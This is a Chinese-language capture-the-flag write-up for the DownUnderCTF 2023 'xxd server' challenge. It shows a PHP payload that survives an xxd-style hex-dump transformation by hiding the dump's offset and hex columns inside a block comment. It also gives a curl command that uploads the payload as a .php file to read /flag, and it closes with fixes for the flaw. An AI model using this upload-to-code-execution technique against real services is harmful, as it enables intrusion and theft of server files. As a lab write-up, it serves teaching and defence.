# DownUnderCTF 2023 xxd server Writeup

## 题目简述

PHP 服务接收上传文件，但不会保存原内容，而是把内容转换成类似 `xxd` 的十六进制转储，再以用户提供的原始文件名写入随机上传目录。文件扩展名没有限制，因此上传名为 `.php` 的文件后，服务器会执行生成出的转储文本。

## 解题过程

每 16 个输入字节会生成一行，格式包含偏移、十六进制列和 ASCII 列：

```text
00000000: <hex bytes>                              <16-byte ASCII>
```

要让 ASCII 列组成 PHP 代码，同时让每行前面的转储文本不破坏语法，可以上传以下内容，并将文件名设为 `uploadme.php`：

```php
<?=readfile(/****/'/flag')?>
```

前 16 字节的 ASCII 列以 `<?=readfile(/*` 开始并打开块注释。下一行的偏移和十六进制列都被注释吞掉；第二组 ASCII 字符开头的 `*/` 关闭注释，余下的 `'/flag')?>` 完成函数调用。于是 Apache 解析转储文件时，实际执行的语义等价于：

```php
<?=readfile('/flag')?>
```

可以用表单或 curl 上传：

```bash
curl -F "file-upload=@uploadme.php;filename=uploadme.php" "http://<HOST>:<PORT>/"
```

访问响应中给出的随机上传路径，页面输出中包含：

```text
DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}
```

## 方法总结

服务虽然变换了上传内容，却保留了攻击者控制的可执行扩展名，而且转储格式仍包含原始 ASCII。利用跨行块注释可以屏蔽自动插入的偏移与十六进制列，重新拼出有效 PHP。上传目录应禁用脚本执行，并由服务端固定安全扩展名，而不能把内容变换当作安全边界。
